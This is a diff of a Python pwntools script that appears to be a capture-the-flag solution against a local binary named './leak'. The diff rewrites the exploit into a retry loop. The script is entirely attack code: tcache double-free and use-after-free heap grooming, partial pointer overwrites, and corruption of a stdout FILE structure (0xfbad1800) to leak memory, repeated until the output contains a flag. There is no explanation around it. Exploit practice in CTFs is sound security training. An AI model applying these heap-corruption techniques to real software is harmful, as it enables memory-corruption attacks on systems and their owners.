@@ -1,8 +1,7 @@
 from pwn import * 
 from LibcSearcher import * 
 # context.log_level = 'debug' 
-p=process('./leak')
-elf=ELF('./leak')
+
 def add(index,size):
     p.recvuntil(b'6. exit\n')
     p.recvuntil(b'Your choice: ')
@@ -25,64 +24,68 @@ def free(index):
     p.sendline(b'3')
     p.recvuntil(b'Index: ')
     p.sendline(str(index).encode())
-p.recvuntil(b'set up.\n')
-add(0,0x30)
-add(1,0x30)
-add(4,0x20)
-add(2,0x30)
-for  i in range(3):
+def exit():
+    p.recvuntil(b'6. exit\n')
+    p.recvuntil(b'Your choice: ')
+    p.sendline(b'6')
+time=0
+while 1:
+    time=time+1
+    print("try time:",time)
+    p=process('./leak')
+    elf=ELF('./leak')
+    p.recvuntil(b'set up.\n')
+    add(0,0xb0)
+    add(1,0xb0)
+    add(2,0x50)
+    add(14,0xb0)
+    add(15,0x200)
+    for i in range(3):
+        free(0)
+        edit(0,p64(0)*2)
+        free(1)
+        edit(1,p64(0)*2)
     free(0)
-    edit(0,p64(0))
     free(1)
-    edit(1,p64(0))
-
-free(0)
-edit(0,p64(0))
-#free(1)
-#free(2)
-
-add(3,0x90)
-add(5,0x20)
-add(8,0xd0)
-add(9,0x50)
-
-free(4)
-free(5)
-edit(5,b'\x40')
-
-add(6,0x20)
-add(7,0x20)
-edit(7,p64(0x6161616161616161)+p64(0x41))
-free(1)
-free(2)
-edit(7,p64(0x65656565)+p64(0x61))
-
-
-free(9)
-free(2)
-
-edit(7,p64(0x65656565)+p64(0xe1))
-for i in range(3):
-    free(8)
-    edit(8,p64(0))
+    add(3,0x50)
+    add(4,0x50)
+    edit(1,b'\x60\xc7')
+    add(5,0xb0)
+    add(6,0xb0)
+    add(7,0xb0)
+    edit(1,p64(0)*11+p64(0x61))
+    free(0)
+    edit(0,p64(0)*2)
+    free(14)
+    edit(14,p64(0)*2)
+    free(0)
+    edit(0,p64(0)*2)
+    for i in range(3):
+        free(2)
+        edit(2,p64(0)*2)
+        free(4)
+        edit(4,p64(0)*2)
     free(2)
-    edit(2,p64(0))
+    free(4)
+    edit(1,p64(0)*11+p64(0xc1))
 
-free(8)
-edit(8,p64(0))
-free(2)
-edit(7,p64(0x65656565)+p64(0x41)+b'\x60\xc7')
-
-add(11,0x50)
-add(10,0x50)
-edit(10,p64(0xfbad1800)+p64(0)*4+p64(0x5fffffffffff))
-edit(2,b'\x68\xc7')
-gdb.attach(p)
-pause()
-add(12,0x30)
-pause()
-add(13,0x30)
-pause()
+    free(4)
+    edit(2,p64(0)*2)
+    edit(4,b'\x68\xc7')
+    edit(7,p64(0xfbad1800)+p64(0)*4+p64(0x5fffffffffff))
+    edit(1,p64(0)*11+p64(0x61))
 
 
-p.interactive()
+    add(8,0x50)
+    add(9,0x50)
+
+    edit(7,p64(0xfbad1800)+p64(0)*3+b'\x50\xf2')
+    gdb.attach(p)
+    exit()
+    recvthing=p.recv(100)
+    if b'flag' in recvthing:
+        print('flag:[',recvthing,']')
+        break
+    # gdb.attach(p)
+
+    # p.interactive()
